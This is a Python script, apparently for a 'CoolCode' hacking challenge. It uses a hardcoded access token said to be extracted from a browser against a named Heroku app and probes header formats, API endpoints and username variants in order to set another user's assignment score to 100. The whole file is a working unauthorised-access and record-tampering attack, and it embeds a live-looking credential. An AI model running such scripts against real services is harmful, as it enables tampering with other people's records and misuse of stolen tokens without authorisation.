#!/usr/bin/env python3
"""
Direct hacking approach for CoolCode challenge
Trying multiple authentication methods and approaches
"""

import requests
import json
import time

class CoolCodeDirectHack:
    def __init__(self):
        self.base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
        self.session = requests.Session()
        
        # The ACCESS_TOKEN we extracted from browser
        self.access_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
        
    def test_different_auth_headers(self):
        """Test different ways to send the ACCESS_TOKEN"""
        
        # Target: Caroline (98ixul)
        test_data = {
            "username": "98ixul",
            "assignmentId": 1,
            "score": 100
        }
        
        url = f"{self.base_url}/api/api/assignment/score"
        
        # Different header formats to try
        auth_variations = [
            {"ACCESS_TOKEN": self.access_token},
            {"Authorization": f"Bearer {self.access_token}"},
            {"Authorization": f"Token {self.access_token}"},
            {"X-ACCESS-TOKEN": self.access_token},
            {"X-Auth-Token": self.access_token},
            {"x-access-token": self.access_token},
            {"access_token": self.access_token},
            {"token": self.access_token},
        ]
        
        print("Testing different authentication header formats...")
        print("="*60)
        
        for i, auth_header in enumerate(auth_variations, 1):
            headers = {
                "Content-Type": "application/json",
                **auth_header
            }
            
            try:
                print(f"\n{i}. Testing with headers: {auth_header}")
                response = requests.post(url, json=test_data, headers=headers, timeout=10)
                
                print(f"   Status Code: {response.status_code}")
                print(f"   Response: {response.text[:200]}")
                
                if response.status_code == 200:
                    print("   ✅ SUCCESS! This header format works!")
                    return auth_header
                    
            except Exception as e:
                print(f"   ❌ Error: {e}")
                
        return None
    
    def try_alternative_endpoints(self):
        """Try different API endpoint variations"""
        
        test_data = {
            "username": "98ixul", 
            "assignmentId": 1,
            "score": 100
        }
        
        # Different endpoint variations
        endpoints = [
            "/api/api/assignment/score",
            "/api/assignment/score", 
            "/assignment/score",
            "/api/score",
            "/score",
            "/api/api/score",
            "/api/assignment/update",
            "/api/api/assignment/update",
            "/api/update_score",
            "/api/api/update_score"
        ]
        
        headers = {
            "Content-Type": "application/json",
            "ACCESS_TOKEN": self.access_token
        }
        
        print("\nTesting different API endpoints...")
        print("="*60)
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                print(f"\nTesting: {url}")
                response = requests.post(url, json=test_data, headers=headers, timeout=10)
                
                print(f"Status: {response.status_code}")
                print(f"Response: {response.text[:200]}")
                
                if response.status_code == 200:
                    print("✅ SUCCESS! Found working endpoint!")
                    return endpoint
                    
            except Exception as e:
                print(f"❌ Error: {e}")
                
        return None
    
    def try_get_requests(self):
        """Maybe we need to GET first to understand the API"""
        
        headers = {
            "ACCESS_TOKEN": self.access_token
        }
        
        # Try GET requests to understand the API
        get_endpoints = [
            "/api/api/assignment",
            "/api/assignment", 
            "/api/api/user/98ixul",
            "/api/user/98ixul",
            "/api/api/scores",
            "/api/scores",
            "/api/api/assignments",
            "/api/assignments"
        ]
        
        print("\nTrying GET requests to understand API structure...")
        print("="*60)
        
        for endpoint in get_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                print(f"\nGET {url}")
                response = requests.get(url, headers=headers, timeout=10)
                
                print(f"Status: {response.status_code}")
                if response.status_code == 200:
                    print(f"✅ Success! Response: {response.text[:300]}")
                else:
                    print(f"Response: {response.text[:200]}")
                    
            except Exception as e:
                print(f"❌ Error: {e}")
    
    def brute_force_usernames(self):
        """Try different username formats for Caroline"""
        
        # Different ways Caroline's username might be formatted
        usernames = [
            "98ixul",
            "Caroline", 
            "caroline",
            "CAROLINE",
            "Caroline_98ixul",
            "98ixul_Caroline",
            "user_98ixul",
            "student_98ixul"
        ]
        
        url = f"{self.base_url}/api/api/assignment/score"
        headers = {
            "Content-Type": "application/json",
            "ACCESS_TOKEN": self.access_token
        }
        
        print("\nTrying different username formats...")
        print("="*60)
        
        for username in usernames:
            test_data = {
                "username": username,
                "assignmentId": 1, 
                "score": 100
            }
            
            try:
                print(f"\nTesting username: {username}")
                response = requests.post(url, json=test_data, headers=headers, timeout=10)
                
                print(f"Status: {response.status_code}")
                print(f"Response: {response.text[:200]}")
                
                if response.status_code == 200:
                    print(f"✅ SUCCESS! Username '{username}' works!")
                    return username
                    
            except Exception as e:
                print(f"❌ Error: {e}")
                
        return None

def main():
    hacker = CoolCodeDirectHack()
    
    print("🚀 Starting CoolCode Direct Hack Attempt")
    print("="*60)
    
    # Test 1: Different auth headers
    working_auth = hacker.test_different_auth_headers()
    
    # Test 2: Different endpoints  
    working_endpoint = hacker.try_alternative_endpoints()
    
    # Test 3: GET requests to understand API
    hacker.try_get_requests()
    
    # Test 4: Different username formats
    working_username = hacker.brute_force_usernames()
    
    print("\n" + "="*60)
    print("SUMMARY:")
    print(f"Working auth header: {working_auth}")
    print(f"Working endpoint: {working_endpoint}")
    print(f"Working username: {working_username}")

if __name__ == "__main__":
    main()
